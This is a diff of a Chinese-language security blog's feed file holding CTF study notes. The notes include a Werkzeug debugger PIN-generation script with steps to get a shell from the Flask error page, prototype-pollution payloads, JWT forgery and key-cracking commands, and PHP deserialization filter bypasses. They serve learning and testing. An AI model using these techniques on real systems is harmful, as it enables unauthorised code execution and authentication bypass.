class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br> <br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span>  <span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br> <br>private_bits = [<br>    <span class="hljs-string">&#x27;170380142167213&#x27;</span>,  <span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>  <span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br> <br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>得到pin码之后在报错页面<br><img src="/blogs/image-1.png" alt="报错页面"><br>点击shell图标(当鼠标浮于任何一行文字时会出现)<br>输入pin码</p><p>得到shell<br><img src="/blogs/image-2.png" alt="shell"><br>最好用os.popen</p>]]></content>
     
     
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title></title>
-    <link href="/blogs/uncategorized/getshell%E5%90%8E%20%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9F%A5%E8%AF%86/"/>
-    <url>/blogs/uncategorized/getshell%E5%90%8E%20%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9F%A5%E8%AF%86/</url>
-    
-    <content type="html"><![CDATA[<p>Linux 查看文件内容命令：cat、tac、head、tail、less、more、nl、paste、rev、uniq、grep、sort、od、awk</p>]]></content>
-    
+    <categories>
+      
+      <category>flask</category>
+      
+    </categories>
     
     
   </entry>
@@ -121,7 +125,7 @@
   
   
   <entry>
-    <title></title>
+    <title>[object Object]</title>
     <link href="/blogs/uncategorized/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
     <url>/blogs/uncategorized/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
     
@@ -134,25 +138,18 @@
   
   
   <entry>
-    <title></title>
-    <link href="/blogs/uncategorized/java/"/>
-    <url>/blogs/uncategorized/java/</url>
+    <title>[object Object]</title>
+    <link href="/blogs/java/java/"/>
+    <url>/blogs/java/java/</url>
     
     <content type="html"><![CDATA[<p><strong>WEB-INF</strong> 是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过<strong>web.xml</strong>文件对要访问的文件进行相应映射才能访问。</p><p> WEB-INF主要包含以下文件或目录：</p><ol><li>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li><li>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li><li>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</li><li>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</li></ol>]]></content>
     
     
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title></title>
-    <link href="/blogs/uncategorized/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
-    <url>/blogs/uncategorized/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
-    
-    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/10032?time__1311=Cqjx2DRii=wxlxGgOKGOYGC+wjxkiioD#toc-3">https://xz.aliyun.com/t/10032?time__1311=Cqjx2DRii%3DwxlxGgOKGOYGC%2BwjxkiioD#toc-3</a></p><p>常用payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>模块中的漏洞见如上链接.<br>![[Pasted image 20250115112602.png]]<br>一个简单的例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">object1 = &#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-number">2</span>&#125;;<br>object1.<span class="hljs-property">__proto__</span>.<span class="hljs-property">foo</span> = <span class="hljs-string">&quot;Hello World&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object1.<span class="hljs-property">foo</span>);<br>object2 = &#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-number">2</span>&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object2.<span class="hljs-property">foo</span>);<br></code></pre></td></tr></table></figure><p>这里object2本来没有foo属性，可见object2.proto和object1是共享的。这样所有的object都带上了这个属性。</p><p>常见的攻击点：merge \ Object.assign</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target)         &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> object1 = &#123;&#125;<br><span class="hljs-keyword">let</span> object2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<br><span class="hljs-title function_">merge</span>(object1, object2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object1.<span class="hljs-property">a</span>, object1.<span class="hljs-property">b</span>)<br><br>object3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object3.<span class="hljs-property">b</span>)<br></code></pre></td></tr></table></figure><p>递归merge, 会存在这样一个操作, object1.proto.b &#x3D; object2.proto.b; 所以object的原型被污染,都带上了b,且值为2</p>]]></content>
-    
+    <categories>
+      
+      <category>java</category>
+      
+    </categories>
     
     
   </entry>
@@ -160,12 +157,37 @@
   
   
   <entry>
-    <title></title>
-    <link href="/blogs/uncategorized/jwt%E4%BC%AA%E9%80%A0/"/>
-    <url>/blogs/uncategorized/jwt%E4%BC%AA%E9%80%A0/</url>
+    <title>[object Object]</title>
+    <link href="/blogs/javascript/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
+    <url>/blogs/javascript/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
+    
+    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/10032">文章</a></p><p>常用payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>模块中的漏洞见如上链接.<br>![[Pasted image 20250115112602.png]]<br>一个简单的例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">object1 = &#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-number">2</span>&#125;;<br>object1.<span class="hljs-property">__proto__</span>.<span class="hljs-property">foo</span> = <span class="hljs-string">&quot;Hello World&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object1.<span class="hljs-property">foo</span>);<br>object2 = &#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-number">2</span>&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object2.<span class="hljs-property">foo</span>);<br></code></pre></td></tr></table></figure><p>这里object2本来没有foo属性，可见object2.proto和object1是共享的。这样所有的object都带上了这个属性。</p><p>常见的攻击点：merge \ Object.assign</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target)         &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> object1 = &#123;&#125;<br><span class="hljs-keyword">let</span> object2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<br><span class="hljs-title function_">merge</span>(object1, object2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object1.<span class="hljs-property">a</span>, object1.<span class="hljs-property">b</span>)<br><br>object3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object3.<span class="hljs-property">b</span>)<br></code></pre></td></tr></table></figure><p>递归merge, 会存在这样一个操作, object1.proto.b &#x3D; object2.proto.b; 所以object的原型被污染,都带上了b,且值为2</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>javascript</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[object Object]</title>
+    <link href="/blogs/jwt/jwt%E4%BC%AA%E9%80%A0/"/>
+    <url>/blogs/jwt/jwt%E4%BC%AA%E9%80%A0/</url>
     
     <content type="html"><![CDATA[<h2 id="jwt的构成"><a href="#jwt的构成" class="headerlink" title="jwt的构成"></a>jwt的构成</h2><p>xxx.xxx.xxx<br>第一部分标示算法等，第二部分是信息，二者均用base64编码<br>第三部分是签名（用第一部分的算法和私钥）</p><h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><ol><li>未签名</li></ol><p>所有的jwt都合法，任意修改数据</p><ol start="2"><li>允许使用none进行签名</li></ol><p>把第一部分的算法改成<code>none</code>, 再丢弃最后的签名，随意篡改第二部分的信息</p><ol start="3"><li>弱密钥</li></ol><p><code>python jwt_tool.py &quot;&lt;JWT&gt;&quot; -C -d jwt-common.txt</code><br>其中<code>jwt-common.txt</code>是密钥字典</p>]]></content>
     
+    
+    <categories>
+      
+      <category>jwt</category>
+      
+    </categories>
     
     
   </entry>
@@ -186,12 +208,18 @@
   
   
   <entry>
-    <title></title>
-    <link href="/blogs/uncategorized/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    <url>/blogs/uncategorized/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <title>[object Object]</title>
+    <link href="/blogs/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    <url>/blogs/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     
     <content type="html"><![CDATA[<p>知识回顾：<br><a href="https://www.cnblogs.com/superwinner/p/17260940.html">https://www.cnblogs.com/superwinner/p/17260940.html</a></p><p>__construct 函数只有在 new的时候会被调用,反序列化不会自动调用.</p><p>protected的变量名前会有null*null的标志，所以不能直接复制（null不会被复制下来）<br>![[Pasted image 20250120104527.png]]<br>private同理，会有null+类名+null前缀<br>![[Pasted image 20250120104649.png]]<br>可以先输出到文件里查看</p><p>见 <a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz">网鼎杯 AreUserializ</a></p><p>反序列化逃逸:</p><ol><li>数组变量中有<code>&#125;</code>会导致序列化-&gt;反序列化之后得到的数组改变</li></ol><p>绕过：</p><ol><li>正则：<br><code>/^O:[\d]/i</code><br>可以在object外面套一层array,同样可以触发</li></ol><p><code>/^[Oa]:[\d]/i</code><br>+号绕过,如 <code>O:+3...</code></p>]]></content>
     
+    
+    <categories>
+      
+      <category>php</category>
+      
+    </categories>
     
     
   </entry>
